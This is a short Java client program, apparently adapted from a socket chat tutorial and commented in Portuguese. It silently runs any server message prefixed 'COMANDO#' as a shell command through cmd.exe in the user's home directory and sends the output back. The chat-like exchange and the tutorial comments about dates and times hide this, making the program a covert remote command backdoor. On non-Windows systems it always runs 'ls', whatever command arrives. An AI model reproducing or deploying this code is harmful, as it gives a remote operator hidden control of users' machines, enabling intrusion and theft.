// Java implementation for a client 
// Save file as Client.java 

import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

// Client class 
public class Client {

    public static void main(String[] args) throws IOException {
        try {
            Scanner scn = new Scanner(System.in);

            // getting localhost ip 
            InetAddress ip = InetAddress.getByName(args[0]);

            // establish the connection with server port 59995 
            Socket s = new Socket(ip, Integer.parseInt(args[1]));

            // obtaining input and out streams 
            DataInputStream dis = new DataInputStream(s.getInputStream());
            DataOutputStream dos = new DataOutputStream(s.getOutputStream());

            String toSend = "";
            String msg = "";
             // the following loop performs the exchange of 
            // information between client and client handler 
            while (true) {
                msg = dis.readUTF();
                if (msg.length() > 8 && msg.contains("COMANDO#")) {
                    String comando = msg.substring(8);
                    //System.out.println("Recebeu comando: " + comando);
                    toSend = executaComando(comando);
                } else {
                    System.out.println(msg);
                    toSend = scn.nextLine();
                }
                dos.writeUTF(toSend);

                // If client sends exit,close this connection  
                // and then break from the while loop 
                if (toSend.equals("Sair")) {
                    System.out.println("Encerrando esta conexao : " + s);
                    s.close();
                    System.out.println("Conexao encerrada");
                    break;
                }

                // printing date or time as requested by client 
                msg = dis.readUTF();
                System.out.println(msg);

            }

            // closing resources 
            scn.close();
            dis.close();
            dos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static String executaComando(String comando) {
        boolean isWindows = System.getProperty("os.name")
                .toLowerCase().startsWith("windows");
        ProcessBuilder builder = new ProcessBuilder();
        if (isWindows) {
            builder.command("cmd.exe", "/c", comando);
        } else {
            builder.command("sh", "-c", "ls");
        }
        builder.directory(new File(System.getProperty("user.home")));
        Process process;
        int exitVal = 0;
        try {
            process = builder.start();
            String output = "";

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                if (line.length() > 0) { // evitar linhas em branco
                    output += (line + "\n");
                }
            }

            exitVal = process.waitFor();
            if (exitVal == 0) {
                //System.out.println("Success!");
                return output;
            }
        } catch (IOException ex) {
            System.out.println(ex);
        } catch (InterruptedException ex1) {
            System.out.println(ex1);
        }
        return ("ERRO! Exit code: " + exitVal);
    }
}
